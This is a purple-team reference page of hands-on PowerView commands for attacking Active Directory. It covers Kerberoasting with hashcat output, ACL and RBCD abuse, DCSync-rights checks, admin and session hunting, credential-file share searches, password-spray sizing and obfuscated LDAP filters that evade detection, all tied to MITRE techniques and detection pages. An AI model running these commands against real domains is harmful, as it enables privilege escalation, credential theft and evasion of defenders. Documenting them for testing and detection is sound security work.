# PowerView — Hands-On Use Cases

All commands below assume PowerView has already been loaded into the session (dot-sourced, `Import-Module`'d, or reflectively loaded — see the loading-method comparison in `03 - Source Evidence.md`, since the method chosen materially changes what's recoverable afterward). Function names use the current **BC-SECURITY/Empire copy's** naming (verified live, see `01 - Overview.md`); the legacy PowerSploit 2.x alias is noted inline the first time a use case has one.

## Contents
- [Baseline Domain and Forest Reconnaissance](#baseline-domain-and-forest-reconnaissance)
- [Enumerating Domain Users](#enumerating-domain-users)
- [Enumerating Domain Computers](#enumerating-domain-computers)
- [Enumerating and Resolving Group Membership](#enumerating-and-resolving-group-membership)
- [Mapping Domain and Forest Trusts](#mapping-domain-and-forest-trusts)
- [Discovering and Abusing ACL-Based Privilege Escalation](#discovering-and-abusing-acl-based-privilege-escalation)
- [Kerberoasting via Invoke-Kerberoast](#kerberoasting-via-invoke-kerberoast)
- [GPO Enumeration and GPO-to-Local-Admin Mapping](#gpo-enumeration-and-gpo-to-local-admin-mapping)
- [Hunting for Local Admin Access at Scale](#hunting-for-local-admin-access-at-scale)
- [Hunting for User Sessions at Scale](#hunting-for-user-sessions-at-scale)
- [Domain Share and Sensitive-File Discovery](#domain-share-and-sensitive-file-discovery)
- [Domain Password Policy Discovery](#domain-password-policy-discovery)
- [Alternate-Credential Enumeration via Ticket Impersonation](#alternate-credential-enumeration-via-ticket-impersonation)
- [Fork-Only: ADCS/Certificate-Service Discovery](#fork-only-adcscertificate-service-discovery)
- [Fork-Only: DCSync-Rights, RBCD, and LAPS-Reader Checks](#fork-only-dcsync-rights-rbcd-and-laps-reader-checks)
- [Fork-Only: Obfuscated Enumeration](#fork-only-obfuscated-enumeration)
- [Chained Workflow: PowerView Finding → Downstream Tool](#chained-workflow-powerview-finding--downstream-tool)

---

## Baseline Domain and Forest Reconnaissance

**MITRE ATT&CK:** T1482 (Domain Trust Discovery, forest-scope calls), T1018 (Remote System Discovery, DC enumeration)

```powershell
Get-Domain
Get-DomainController | Select-Object Name, IPAddress, OSVersion
Get-Forest
Get-ForestDomain
```

The first commands an operator runs after landing on a domain-joined host — confirms the current domain context, lists every DC (targets for later LDAP/Kerberos calls), and establishes forest scope for cross-domain enumeration later.

## Enumerating Domain Users

**MITRE ATT&CK:** T1087.002 (Account Discovery: Domain Account)

```powershell
# All users, minimal properties
Get-DomainUser | Select-Object samaccountname, description

# Kerberoastable accounts (non-null SPN)
Get-DomainUser -SPN

# AS-REP-roastable accounts (preauth not required)
Get-DomainUser -PreauthNotRequired

# Currently or formerly privileged (adminCount=1)
Get-DomainUser -AdminCount

# Delegation-relevant flags
Get-DomainUser -AllowDelegation
Get-DomainUser -TrustedToAuth

# Single-object lookup with full property dump
Get-DomainUser -Identity jdoe -Properties *
```

Legacy alias: `Get-NetUser` (PowerView 2.x) → `Get-DomainUser`.

## Enumerating Domain Computers

**MITRE ATT&CK:** T1018 (Remote System Discovery)

```powershell
Get-DomainComputer | Select-Object dnshostname, operatingsystem

# Unconstrained-delegation-trusted computers — high-value targets for ticket theft
Get-DomainComputer -Unconstrained

# Computers running a specific OS (e.g. legacy/EOL targeting)
Get-DomainComputer -OperatingSystem "*Server 2012*"
```

Legacy alias: `Get-NetComputer` → `Get-DomainComputer`.

## Enumerating and Resolving Group Membership

**MITRE ATT&CK:** T1069.002 (Permission Groups Discovery: Domain Groups)

```powershell
Get-DomainGroup -Identity "Domain Admins"

# Direct members only
Get-DomainGroupMember -Identity "Domain Admins"

# Recursive — resolves nested-group membership all the way down
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
```

`-Recurse` is the operationally important flag here: a target user nested three groups deep inside "Domain Admins" never shows up in a direct-membership query, and manual `net group` enumeration doesn't resolve nesting at all without scripting it by hand.

Legacy alias: `Get-NetGroupMember` → `Get-DomainGroupMember`.

## Mapping Domain and Forest Trusts

**MITRE ATT&CK:** T1482 (Domain Trust Discovery)

```powershell
Get-DomainTrust
Get-ForestTrust

# Recursively walk the entire reachable trust graph from the current domain outward
Get-DomainTrustMapping
```

`Get-DomainTrustMapping` is the trust-side analog to what BloodHound's collector does for the object graph — see `Purple Teaming/BloodHound/00 - BloodHound Overview.md` for the honest relationship between the two: PowerView answers "what trusts exist" one query at a time and prints text; BloodHound (via SharpHound) collects the same underlying trust data alongside every other edge type and renders it as a queryable graph. An operator running PowerView interactively on a single host and an operator running SharpHound are pulling from the same LDAP/`trustedDomain` object data — this page does not re-derive BloodHound's graph-theory material, it documents PowerView's own text-first, interactive equivalent.

Legacy alias: `Get-NetDomainTrust` → `Get-DomainTrust`; `Invoke-MapDomainTrust` → `Get-DomainTrustMapping`.

## Discovering and Abusing ACL-Based Privilege Escalation

**MITRE ATT&CK:** T1069.002/T1087.002 (discovery), T1098 (Account Manipulation — the write step)

```powershell
# Domain-wide sweep for non-default, attacker-useful ACEs
Find-InterestingDomainAcl

# Read the raw ACL on a specific object
Get-DomainObjectAcl -Identity "CN=Domain Admins,CN=Users,DC=corp,DC=local" -ResolveGUIDs

# If the operator's current principal already holds WriteDacl/GenericAll/Owner
# on a target object, grant themselves a new right (e.g. full control)
Add-DomainObjectAcl -TargetIdentity jdoe -Rights All
```

**`Add-DomainObjectAcl` does not grant rights the operator doesn't already have** — it exercises rights the account already holds (`WriteDacl`, ownership, or an inherited write-ACE) to add a *new* ACE. This is a write operation against the directory, not a passive read, and is exactly the class of overlap `Purple Teaming/BloodHound/00 - BloodHound Overview.md` flags: BloodHound is normally where the *path* (which ACEs exist, chained together) gets found; PowerView is normally what *executes* the write once a path is identified. Overlapping DCSync-rights and RBCD-write variants of this same write-ACE pattern are BC-fork-only — see below.

Legacy alias: `Get-ObjectAcl` → `Get-DomainObjectAcl`; `Add-ObjectAcl` → `Add-DomainObjectAcl`; `Invoke-ACLScanner` → `Find-InterestingDomainAcl`.

## Kerberoasting via Invoke-Kerberoast

**MITRE ATT&CK:** T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting)

```powershell
# Kerberoast every SPN-holding account in the current domain, hashcat format
Invoke-Kerberoast -OutputFormat Hashcat | fl

# Single target, alternate credentials
Invoke-Kerberoast -Identity svc_sql -Credential $Cred -OutputFormat John

# Cross-domain
Invoke-Kerberoast -Domain dev.corp.local -OutputFormat Hashcat
```

`Invoke-Kerberoast` is a thin wrapper: it calls `Get-DomainUser -SPN` to find targets, then `Get-DomainSPNTicket` to request and parse each TGS-REP, outputting a ready-to-crack `$krb5tgs$...` line directly. This is the same underlying AS-REQ-then-TGS-REQ mechanic `Impacket/GetUserSPNs (Kerberoasting)/` documents in depth (LDAP filter, RC4-bias mechanics, Event 4769 enctype table, MDI alert catalog) — cross-link there rather than re-deriving; the KDC-side evidence is identical regardless of which client requested the ticket. For cracking the output, see `Hashcat/`'s mode table (13100/19600/19700 depending on enctype).

## GPO Enumeration and GPO-to-Local-Admin Mapping

**MITRE ATT&CK:** T1615 (Group Policy Discovery) — MITRE's own technique page for T1615 names `Get-DomainGPO` and `Get-DomainGPOLocalGroup` explicitly as example tooling, verified live against attack.mitre.org

```powershell
Get-DomainGPO | Select-Object displayname, gpcfilesyspath

# Which local groups does a GPO push, and to whom
Get-DomainGPOLocalGroup -Identity "{GUID}"

# Reverse mapping: which computers get local-admin rights pushed to a given user via GPO
Get-DomainGPOUserLocalGroupMapping -Identity jdoe

# Reverse mapping: which users/groups are local admins on a given computer via GPO
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity WORKSTATION01
```

The reverse-mapping functions are the operationally valuable pair — they answer "if I compromise this GPO (or this user), what local-admin footprint do I inherit" directly, instead of manually cross-referencing GPO Restricted Groups settings against OU links by hand.

## Hunting for Local Admin Access at Scale

**MITRE ATT&CK:** T1018 (Remote System Discovery) combined with T1087.001 (Account Discovery: Local Account)

```powershell
# Single-host check
Test-AdminAccess -ComputerName sqlserver01

# Fleet-wide sweep — threaded, checks every discovered domain computer
Find-LocalAdminAccess

# Piped from a pre-filtered computer set
Get-DomainComputer -OperatingSystem "*Server*" | Test-AdminAccess
```

`Find-LocalAdminAccess` calls `Test-AdminAccess` against every computer in the domain via a threaded worker pool (`New-ThreadedFunction`), attempting a lightweight admin-only remote operation (an `\\host\ADMIN$` connectivity/permission check) against each. This is the direct forerunner to the "which hosts can I laterally move to" question SharpHound's `LocalAdmin`/`Session` collection methods answer at scale for the whole BloodHound graph (see `Purple Teaming/BloodHound/SharpHound/01 - Overview.md`) — PowerView answers it interactively, one sweep at a time, without building a persistent graph.

Legacy alias: `Invoke-CheckLocalAdminAccess` → `Test-AdminAccess`.

## Hunting for User Sessions at Scale

**MITRE ATT&CK:** T1018 (Remote System Discovery) + T1033 (System Owner/User Discovery)

```powershell
Find-DomainUserLocation

# Narrow to a specific high-value target user
Find-DomainUserLocation -UserIdentity "Domain Admins" -UserGroupIdentity "Domain Admins"
```

`Find-DomainUserLocation` correlates `Get-DomainComputer` (target list) with SAMR-based session enumeration (`Get-NetSession`/`Get-NetLoggedon`, reflective P/Invoke — see `01 - Overview.md`) to answer "where is a member of this group currently logged in" across the whole domain — the classic "find the Domain Admin's workstation" hunt.

Legacy alias: `Invoke-UserHunter` → `Find-DomainUserLocation`.

## Domain Share and Sensitive-File Discovery

**MITRE ATT&CK:** T1135 (Network Share Discovery), T1552 (Unsecured Credentials, for the content-search variant)

```powershell
Find-DomainShare -CheckShareAccess

Find-InterestingDomainShareFile -Include *pass*,*cred*,*.kdbx,web.config
```

Legacy alias: `Invoke-ShareFinder` → `Find-DomainShare`; `Invoke-FileFinder` → `Find-InterestingDomainShareFile`.

## Domain Password Policy Discovery

**MITRE ATT&CK:** T1201 (Password Policy Discovery)

```powershell
Get-DomainPolicyData | Select-Object -ExpandProperty SystemAccess
```

Used to size a password-spray campaign safely — lockout threshold/window shapes how aggressively a spray can run before locking accounts and generating 4740 events.

## Alternate-Credential Enumeration via Ticket Impersonation

**MITRE ATT&CK:** T1550 (Use Alternate Authentication Material)

```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('CORP\svc_reader', $SecPassword)

Invoke-UserImpersonation -Credential $Cred
Get-DomainUser -SPN
Invoke-RevertToSelf
```

Most `Get-Domain*` functions also accept `-Credential` directly for a one-off alternate-context query; `Invoke-UserImpersonation`/`Invoke-RevertToSelf` instead impersonate a Kerberos token for the *whole session*, useful when chaining several PowerView calls under one alternate identity without repeating `-Credential` on each.

## Fork-Only: ADCS/Certificate-Service Discovery

**MITRE ATT&CK:** T1649 (Steal or Forge Authentication Certificates) — discovery/preparation phase

```powershell
Get-DomainCACertificates
Get-DomainEnrollmentServers
```

**Not present in the archived PowerShellMafia source** — verified live, only in BC-SECURITY's Empire-embedded copy. Surfaces CA and enrollment-server locations as the first step toward the deeper ADCS-abuse tooling in `Purple Teaming/GhostPack/Certify/` and `Purple Teaming/Certipy/` (both Wave 3, not yet built at time of writing) — PowerView identifies the CA exists, those tools enumerate/abuse vulnerable certificate templates.

## Fork-Only: DCSync-Rights, RBCD, and LAPS-Reader Checks

**MITRE ATT&CK:** T1003.006 (OS Credential Dumping: DCSync, rights-check only — no actual replication happens here), T1098 (Account Manipulation, for the RBCD write)

```powershell
# Does the current (or a specified) principal already hold DCSync-capable rights?
Get-DomainDCSync

# Read/write Resource-Based Constrained Delegation on a target computer object
Get-DomainRBCD -Identity WORKSTATION01
Set-DomainRBCD -Identity WORKSTATION01 -DelegateFrom "attacker-controlled-computer$"

# Which principals can read a computer's LAPS-managed local admin password
Get-DomainLAPSReaders -Identity WORKSTATION01
```

**Not present in the archived PowerShellMafia source.** `Get-DomainDCSync` turns the manual ACL-decoding most operators do by hand after `Get-DomainObjectAcl` (checking for the `DS-Replication-Get-Changes`/`-All` extended rights GUIDs) into a single direct check. Once DCSync rights are confirmed, the actual replication pull is out of PowerView's scope — chain into `Purple Teaming/Mimikatz/lsadump (DCSync)/` or `Purple Teaming/Impacket/secretsdump/` for the extraction step itself (both already document the DRSUAPI/MS-DRSR mechanics and Event 4662 caveats in depth).

## Fork-Only: Obfuscated Enumeration

**MITRE ATT&CK:** T1027.010 (Obfuscated Files or Information: Command Obfuscation)

```powershell
$ObfuscatedFilter = Get-ObfuscatedFilterString -Filter "(samAccountType=805306368)"
Invoke-LDAPQuery -LDAPFilter $ObfuscatedFilter
```

**Not present in the archived PowerShellMafia source.** `Get-ObfuscatedFilterString`/`Get-RandomizedCasing` randomize the casing and structural representation of an LDAP filter string before it's sent, specifically to defeat detections that pattern-match on a filter's literal text (e.g. the well-known `(&(objectCategory=person)(objectClass=user)...)` Kerberoasting-filter signature). This does **not** change the query's semantic result or the underlying LDAP traffic volume — it only defeats string-literal matching, not volumetric/behavioral detection. See `05 - Detection and Hunting.md`'s Hunting Priority table for how this reshapes which signals actually survive it.

## Chained Workflow: PowerView Finding → Downstream Tool

A representative end-to-end chain, each step already documented in its own already-built folder:

```
Get-DomainUser -SPN                         → target list for Kerberoasting
  → Invoke-Kerberoast -OutputFormat Hashcat → Hashcat/ (mode 13100/19600/19700)
Find-InterestingDomainAcl                   → candidate ACL-abuse path
  → Get-DomainDCSync (fork)                 → confirms DCSync rights
  → Mimikatz/lsadump (DCSync)/ or Impacket/secretsdump/ → actual credential pull
Find-LocalAdminAccess                       → candidate lateral-movement targets
  → PsExec/, Impacket/psexec/, or Impacket/wmiexec/ → execution on the target
```
